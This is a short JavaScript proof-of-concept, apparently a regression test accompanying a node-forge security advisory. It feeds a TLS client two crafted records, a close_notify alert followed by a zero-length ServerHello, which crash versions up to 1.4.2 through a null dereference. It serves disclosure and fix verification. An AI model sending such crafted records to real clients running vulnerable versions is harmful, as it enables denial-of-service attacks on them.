// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-j8rw-jp99-435v
//
// @manus-use

const forge = require('../..');
const hx = s => s.replace(/\s+/g,'').match(/../g).map(h=>String.fromCharCode(parseInt(h,16))).join('');
const c = forge.tls.createConnection({ server:false, verify:()=>true,
  connected(){}, tlsDataReady(){}, dataReady(){}, closed(){}, error(){} });
c.handshake();                               // client in state SERVER_HELLO, session set
c.process(hx('15 03 01 00 02 01 00'));       // warning close_notify -> reset: session=null, fail=false, expect=SERVER_HELLO
c.process(hx('16 03 01 00 04 02 00 00 00')); // stray zero-length ServerHello handshake record
// <= 1.4.2: TypeError: Cannot read properties of null (reading 'md5')
//    at tls.handleHandshake (lib/tls.js:2060)  -> process crash
// 1.4.3: the record is ignored
console.log('no crash');
